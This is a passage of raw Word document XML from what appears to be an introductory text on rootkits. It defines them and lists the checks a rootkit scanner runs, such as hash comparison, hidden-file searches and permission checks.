        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>“Ad</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mi</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>or”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>cess)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">er </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>, w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>hout</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>au</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he sys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">wners and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>eg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>agers.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="292" w:firstLine="710"/>
      </w:pPr>
      <w:r>
        <w:t>Roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>scanner</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s a scann</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>o ensure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>em</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ean</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of nas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>oo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ool</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>scans for roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s, backdoors</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>exp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s by runn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>ke:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>- MD5 hash co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pare</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>ook</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>for defau</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>es used by roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:t>rong f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e per</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ons for b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>ook</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>uspec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ngs </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>KM and K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">D </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>odu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>ook</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>for h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>dden f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>- Op</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>scan w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nary</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="72" w:firstLine="710"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>any</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t>fere</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>vers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ons</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>perform</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>bas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ll</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>sa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>func</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-18"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l kn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
